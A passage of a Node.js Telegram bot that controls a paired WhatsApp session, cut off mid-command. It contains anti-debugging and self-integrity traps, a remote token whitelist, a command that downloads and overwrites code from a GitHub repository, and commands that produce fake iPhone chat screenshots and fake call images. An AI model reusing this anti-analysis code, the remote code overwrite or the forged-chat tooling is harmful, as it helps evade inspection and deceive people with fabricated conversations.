const { Telegraf } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const { tokenBot, ownerID } = require("./settings/config");
const adminFile = './database/adminuser.json';
const FormData = require("form-data");
const https = require("https");
function fetchJsonHttps(url, timeout = 5000) {
  return new Promise((resolve, reject) => {
    try {
      const req = https.get(url, { timeout }, (res) => {
        const { statusCode } = res;
        if (statusCode < 200 || statusCode >= 300) {
          let _ = '';
          res.on('data', c => _ += c);
          res.on('end', () => reject(new Error(`HTTP ${statusCode}`)));
          return;
        }
        let raw = '';
        res.on('data', (chunk) => (raw += chunk));
        res.on('end', () => {
          try {
            const json = JSON.parse(raw);
            resolve(json);
          } catch (err) {
            reject(new Error('Invalid JSON response'));
          }
        });
      });
      req.on('timeout', () => {
        req.destroy(new Error('Request timeout'));
      });
      req.on('error', (err) => reject(err));
    } catch (err) {
      reject(err);
    }
  });
}

const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  areJidsSameUser,
  encodeSignedDeviceIdentity,
  encodeWAMessage,
  jidEncode,
  patchMessageBeforeSending,
  encodeNewsletterMessage,
  BufferJSON,
  DisconnectReason,
  proto,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const chalk = require('chalk');
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 50) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

const databaseUrl = 'https://raw.githubusercontent.com/ridwan-dev01/wazz-dev/refs/heads/main/whitelist.json';
const thumbnailUrl = "https://files.catbox.moe/1ry52e.jpg";

const thumbnailVideo = "https://files.catbox.moe/q9nh50.mp4";

function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

function activateSecureMode() {
  secureMode = true;
}

(function() {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      throw new Error(randErr());
    }
  }, 1000);

  const code = "AlwaysProtect";
  if (code.length !== 13) {
    throw new Error(randErr());
  }

  function secure() {
    console.log(chalk.bold.yellow(`⠀⠀
⠀⬡═—⊱ CHECKING SERVER ⊰—═⬡
┃Bot Sukses Terhubung Terimakasih 
⬡═―—―――――――――――――――――—═⬡
  `))
  }
  
  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
      throw new Error(randErr());
    }
  }, 2000);

  secure();
})();

(() => {
  const hardExit = process.exit.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  const hardKill = process.kill.bind(process);
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  setInterval(() => {
    try {
      if (process.exit.toString().includes("Proxy") ||
          process.kill.toString().includes("Proxy")) {
        console.log(chalk.bold.yellow(`
⠀⬡═—⊱ BYPASS CHECKING ⊰—═⬡
┃PERUBAHAN CODE MYSQL TERDETEKSI
┃ SCRIPT DIMATIKAN / TIDAK BISA PAKAI
⬡═―—―――――――――――――――――—═⬡
  `))
        activateSecureMode();
         hardExit(1);
      }

      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          console.log(chalk.bold.yellow(`
⠀⬡═—⊱ BYPASS CHECKING ⊰—═⬡
┃PERUBAHAN CODE MYSQL TERDETEKSI
┃ SCRIPT DIMATIKAN / TIDAK BISA PAKAI
⬡═―—―――――――――――――――――—═⬡
  `))
        activateSecureMode();
         hardExit(1);
        }
      }
    } catch {
      activateSecureMode();
       hardExit(1);
    }
  }, 2000);

  global.validateToken = async (databaseUrl, tokenBot) => {
  try {
    const res = await fetchJsonHttps(databaseUrl, 5000);
    const tokens = (res && res.tokens) || [];

    if (!tokens.includes(tokenBot)) {
      console.log(chalk.bold.yellow(`
⠀⬡═—⊱ BYPASS ALERT⊰—═⬡
┃ NOTE : SERVER MENDETEKSI KAMU
┃  MEMBYPASS PAKSA SCRIPT !
⬡═―—―――――――――――――――――—═⬡
  `));

      try {
      } catch (e) {
      }

      activateSecureMode();
       hardExit(1);
    }
  } catch (err) {
    console.log(chalk.bold.yellow(`
⠀⬡═—⊱ CHECK SERVER ⊰—═⬡
┃ DATABASE : MYSQL
┃ NOTE : SERVER GAGAL TERHUBUNG
⬡═―—―――――――――――――――――—═⬡
  `));
    activateSecureMode();
     hardExit(1);
  }
};
})();

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    try {
        const res = await fetchJsonHttps(databaseUrl, 5000);
        const authorizedTokens = (res && res.tokens) || [];
        return Array.isArray(authorizedTokens) && authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}

(async () => {
    await validateToken(databaseUrl, tokenBot);
})();

const GH_OWNER = "ridwan-dev01";
const GH_REPO = "auto-update";
const GH_BRANCH = "main";

async function downloadRepo(dir = "", basePath = "/home/container") {
  const url = `https://api.github.com/repos/${GH_OWNER}/${GH_REPO}/contents/${dir}?ref=${GH_BRANCH}`;

  const { data } = await axios.get(url, {
    headers: { "User-Agent": "Mozilla/5.0" }
  });

  for (const item of data) {
    const local = path.join(basePath, item.path);

    if ([
      "settings/config.js",
      "cmd.json",
      "database/adminuser.json"
    ].includes(item.path)) continue;

    if (item.type === "file") {
      const fileData = await axios.get(item.download_url, {
        responseType: "arraybuffer"
      });

      fs.mkdirSync(path.dirname(local), { recursive: true });
      fs.writeFileSync(local, Buffer.from(fileData.data));
    }

    if (item.type === "dir") {
      fs.mkdirSync(local, { recursive: true });
      await downloadRepo(item.path, basePath);
    }
  }
}

const bot = new Telegraf(tokenBot);
let tokenValidated = false;
let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const { CHANNEL_USERNAME } = require("./settings/config");

async function checkJoin(userId) {
  try {
    const member = await bot.telegram.getChatMember(
      CHANNEL_USERNAME,
      userId
    );

    return [
      "member",
      "administrator",
      "creator"
    ].includes(member.status);

  } catch {
    return false;
  }
}

const checkCommandEnabled = async (ctx, next) => {
  if (!ctx.message?.text) return next();

  const text = ctx.message.text.trim();

  if (!text.startsWith("/")) return next();

  // ambil command utama
  let cmd = text.split(" ")[0].toLowerCase();

  // hapus @botusername
  if (cmd.includes("@")) {
    cmd = cmd.split("@")[0];
  }

  const db = loadDB();
  const chatId = String(ctx.chat.id);

  // =========================
  // GLOBAL DISABLE COMMAND
  // =========================
  if (db.commands?.[cmd]?.disabled) {
    return ctx.reply(
      db.commands[cmd].reason ||
      "⛔ Command ini dimatikan."
    );
  }

  // =========================
  // BLOCK COMMAND CHAT
  // =========================
  const blocked =
    db.groupCmdBlock?.[chatId] || [];

  // normalize semua cmd
  const normalizedBlocked = blocked.map(c =>
    c.toLowerCase().split("@")[0]
  );

  if (normalizedBlocked.includes(cmd)) {
    return ctx.reply(
      "⛔ Command ini diblock di chat ini."
    );
  }

  return next();
};

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'
const dbPath = "./Db/ControlCommand.json";

function loadDB() {
  if (!fs.existsSync(dbPath)) {
    return {
      commands: {},
      groupCmdBlock: {}
    };
  }

  return JSON.parse(fs.readFileSync(dbPath, "utf8"));
}

function saveDB(data) {
  fs.writeFileSync(
    dbPath,
    JSON.stringify(data, null, 2)
  );
}

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addpremUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 524 / 524;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
console.clear();
  console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠠⠤⠤⠤⠤⠤⣤⣤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣤⠤⠤⠤⠤⠤⠄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠿⢶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⡶⠿⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣀⣀⣠⣤⣤⣴⠶⠶⠶⠶⠶⠶⠶⠶⠶⠿⠿⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠿⠶⠶⠶⠶⠶⠶⠶⣦⣤⣄⣀⣀⡀⠀⠀
⠚⠛⠉⠉⠉⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⡴⠶⠶⠿⠿⠿⣧⡀⠀⠀⠀⠤⢄⣀⣀⡀⢀⣷⠿⠿⠿⠶⠶⣤⣀⣀⡀⠀⠀⠀⠀⠉⠉⠛⠛⠒
⠀⠀⠀⠀⠀⠀⠀⢀⣠⡴⠞⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⢸⣿⣷⣶⣦⣤⣄⣈⡑⢦⣀⣸⡇⠀⠀⠀⠀⠀⠀⠈⠉⠛⠳⢦⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⠔⠚⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠟⠉⠉⠉⠉⠙⠛⠿⣿⣮⣷⣤⣤⣤⣿⣆⠀⠀⠀⠀⠀⠀⠈⠉⠚⠦⣄⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢻⣯⣧⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢷⡤⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠻⠿⠿⣿⣶⣶⣦⣄⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣯⡛⠻⢦⡀⢀⡴⠟⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣆⠀⠙⢿⡀⢀⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣆⠀⠈⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⡆⠀⠸⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


» Information:
  Developer: Muhamad Ridwan
  Version: 15.0
  Status: Bot Connected
  `))
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '5.15.7'],
        getMessage: async (key) => ({
            conversation: 'Apophis',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐕𝐮𝐬𝐞𝐮 𝐗-𝐫𝐚𝐲 ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Type: Connected
╘—————————————————═⬡`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`
⠀⠀⠀
░


  `))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 500

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

bot.command("addbot", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /addbot 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber, "IKBAL123");
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `\`\`\`
⬡═―—⊱ ⎧ 𝐕𝐮𝐬𝐞𝐮 𝐗-𝐫𝐚𝐲 ⎭ ⊰―—═⬡
⌑ Number: ${phoneNumber}
⌑ Pairing Code: ${formattedCode}
⌑ Type: Not Connected
╘═——————————————═⬡
\`\`\``;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "Markdown"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `\`\`\`
 ⬡═―—⊱ ⎧ 𝐕𝐮𝐬𝐞𝐮 𝐗-𝐫𝐚𝐲 ⎭ ⊰―—═⬡
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Type: Connected
╘═——————————————═⬡\`\`\`
`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "Markdown" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

const loadJSON = (file) => {
    if (!fs.existsSync(file)) return [];
    return JSON.parse(fs.readFileSync(file, 'utf8'));
};

const saveJSON = (file, data) => {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
    
    
let adminUsers = loadJSON(adminFile);

const checkAdmin = (ctx, next) => {
    if (!adminUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ Anda bukan Admin. jika anda adalah owner silahkan daftar ulang ID anda menjadi admin");
    }
    next();
};


};
// --- Fungsi untuk Menambahkan Admin ---
const loadAdmins = () => {
    try {
        const data = fs.readFileSync(adminFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const saveAdmins = (admins) => {
    try {
        fs.writeFileSync(adminFile, JSON.stringify(admins, null, 2));
    } catch (err) {
    }
};

const addAdmin = (userId) => {
    const admins = loadAdmins();
    admins[userId] = true;
    saveAdmins(admins);
    return true;
};

const removeAdmin = (userId) => {
    const admins = loadAdmins();
    delete admins[userId];
    saveAdmins(admins);
    return true;
};

const isAdmin = (userId) => {
    const admins = loadAdmins();
    return admins[userId] === true || userId == ownerID;
};

bot.command('addadmin', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /addadmin 12345678");
    }
    
    const userId = args[1];
    addAdmin(userId);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai admin`);
});

bot.command('deladmin', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /deladmin 12345678");
    }
    
    const userId = args[1];
    if (userId == ownerID) {
        return ctx.reply("❌ ☇ Tidak dapat menghapus pemilik utama");
    }
    
    removeAdmin(userId);
    ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar admin`);
});


bot.command("tiktok", async (ctx) => {
  const args = ctx.message.text.split(" ")[1];

  if (!args) {
    return ctx.reply(
      "🎵 Download TikTok\n\nContoh:\n/tiktok https://vt.tiktok.com/xxxx"
    );
  }

  try {
    const processing = await ctx.reply("⏳ Mengunduh video TikTok...");

    const params = new URLSearchParams({
      url: args,
      hd: "1",
    });

    const { data } = await axios.post(
      "https://tikwm.com/api/",
      params.toString(),
      {
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        },
        timeout: 30000,
      }
    );

    if (!data || data.code !== 0 || !data.data?.play) {
      throw new Error("Video tidak ditemukan");
    }

    await ctx.telegram.deleteMessage(
      processing.chat.id,
      processing.message_id
    );

    await ctx.replyWithVideo(data.data.play, {
      caption: `🎵 ${data.data.title || "Video TikTok"}\n\n✅ Tanpa watermark`,
    });

    if (data.data.music) {
      await ctx.replyWithAudio(data.data.music, {
        title: "Audio Original",
      });
    }
  } catch (err) {
    console.error(err);
    await ctx.reply(`❌ ${err.message}`);
  }
});

// Logging (biar gampang trace error)
function log(message, error) {
  if (error) {
    console.error(`[EncryptBot] ❌ ${message}`, error);
  } else {
    console.log(`[EncryptBot] ✅ ${message}`);
  }
}

bot.command("iqc", async (ctx) => {
  const fullText = (ctx.message.text || "").split(" ").slice(1).join(" ").trim();

  try {
    await ctx.sendChatAction("upload_photo");

    if (!fullText) {
      return ctx.reply(
        "🧩 Masukkan teks!\nContoh: /iqc Konichiwa|06:00|100"
      );
    }

    const parts = fullText.split("|");
    if (parts.length < 2) {
      return ctx.reply(
        "❗ Format salah!\n🍀 Contoh: /iqc Teks|WaktuChat|StatusBar"
      );
    }

    let [message, chatTime, statusBarTime] = parts.map((p) => p.trim());

    if (!statusBarTime) {
      const now = new Date();
      statusBarTime = `${String(now.getHours()).padStart(2, "0")}:${String(
        now.getMinutes()
      ).padStart(2, "0")}`;
    }

    if (message.length > 80) {
      return ctx.reply("🍂 Teks terlalu panjang! Maksimal 80 karakter.");
    }

    const url = `https://api.zenzxz.my.id/maker/fakechatiphone?text=${encodeURIComponent(
      message
    )}&chatime=${encodeURIComponent(chatTime)}&statusbartime=${encodeURIComponent(
      statusBarTime
    )}`;

    const response = await fetch(url);
    if (!response.ok) throw new Error("Gagal mengambil gambar dari API");

    const buffer = await response.buffer();

    const caption = `
✨ <b>Fake Chat iPhone Berhasil Dibuat!</b>

💬 <b>Pesan:</b> ${message}
⏰ <b>Waktu Chat:</b> ${chatTime}
📱 <b>Status Bar:</b> ${statusBarTime}
`;

    await ctx.replyWithPhoto({ source: buffer }, { caption, parse_mode: "HTML" });
  } catch (err) {
    console.error(err);
    await ctx.reply("🍂 Gagal membuat gambar. Coba lagi nanti.");
  }
});

//MD MENU
bot.command("pullupdate", async (ctx) => {
  if (ctx.from.id.toString() !== ownerID.toString()) {
    return ctx.reply("❌ Khusus owner");
  }

  await ctx.reply("⏳ Auto Update Script Mohon Tunggu...");

  try {
    await downloadRepo("");

    await ctx.reply(`✅ Update Berhasil
📄 File: main.js
♻️ Restarting...

© VUSEU X-RAY`);

    setTimeout(() => process.exit(0), 1500);

  } catch (e) {
    console.log(e);

    await ctx.reply(`❌ Gagal update
${e.message}`);
  }
});

bot.command("blockcmd", async (ctx) => {
  if (ctx.from.id.toString() !== ownerID.toString()) {
    return ctx.reply("❌ Khusus owner")
  }

  try {
    if (ctx.chat.type === "private")
      return ctx.reply("❌ Command ini hanya untuk grup.");

    const args = ctx.message.text.split(" ").slice(1);

    if (!args[0])
      return ctx.reply("Example : /blockcmd /menu");

    const cmd = args[0].toLowerCase();

    const db = loadDB();
    const groupId = String(ctx.chat.id);

    if (!db.groupCmdBlock)
      db.groupCmdBlock = {};

    if (!db.groupCmdBlock[groupId])
      db.groupCmdBlock[groupId] = [];

    // sudah ada
    if (db.groupCmdBlock[groupId].includes(cmd)) {
      return ctx.reply("⚠️ Command sudah diblock.");
    }

    db.groupCmdBlock[groupId].push(cmd);

    saveDB(db);

    ctx.reply(`✅ Berhasil block command ${cmd}`);
  } catch (err) {
    console.log(err);
    ctx.reply("Terjadi error.");
  }
});


// ===============================
// UNBLOCK CMD GROUP
// ===============================

bot.command("unblockcmd", async (ctx) => {
  if (ctx.from.id.toString() !== ownerID.toString()) {
    return ctx.reply("❌ Khusus owner")
  }

  try {
    if (ctx.chat.type === "private")
      return ctx.reply("❌ Command ini hanya untuk grup.");

    const args = ctx.message.text.split(" ").slice(1);

    if (!args[0])
      return ctx.reply("Example : /unblockcmd /menu");

    const cmd = args[0].toLowerCase();

    const db = loadDB();
    const groupId = String(ctx.chat.id);

    if (!db.groupCmdBlock?.[groupId]) {
      return ctx.reply("⚠️ Tidak ada command yang diblock.");
    }

    db.groupCmdBlock[groupId] =
      db.groupCmdBlock[groupId].filter(c => c !== cmd);

    saveDB(db);

    ctx.reply(`✅ Berhasil unblock command ${cmd}`);
  } catch (err) {
    console.log(err);
    ctx.reply("Terjadi error.");
  }
});

bot.command("listblockcmd", async (ctx) => {
  if (ctx.from.id.toString() !== ownerID.toString()) {
    return ctx.reply("❌ Khusus owner")
  }

  try {
    const db = loadDB();
    const chatId = String(ctx.chat.id);

    const blocked =
      db.groupCmdBlock?.[chatId] || [];

    if (blocked.length < 1) {
      return ctx.reply(
        "❌ Tidak ada command yang diblock."
      );
    }

    let teks = `📌 LIST BLOCK COMMAND\n\n`;

    blocked.forEach((cmd, i) => {
      teks += `${i + 1}. ${cmd}\n`;
    });

    ctx.reply(teks);

  } catch (err) {
    console.log(err);
    ctx.reply("Terjadi error.");
  }
});

bot.command("fakecall", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").split("|");

  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.photo) {
    return ctx.reply("❌ Reply ke foto untuk dijadikan avatar!");
  }

  const nama = args[0]?.trim();
  const durasi = args[1]?.trim();

  if (!nama || !durasi) {
    return ctx.reply("📌 Format: `/fakecall nama|durasi` (reply foto)", { parse_mode: "Markdown" });
  }

  try {
    const fileId = ctx.message.reply_to_message.photo.pop().file_id;
    const fileLink = await ctx.telegram.getFileLink(fileId);

    const api = `https://api.zenzxz.my.id/maker/fakecall?nama=${encodeURIComponent(
      nama
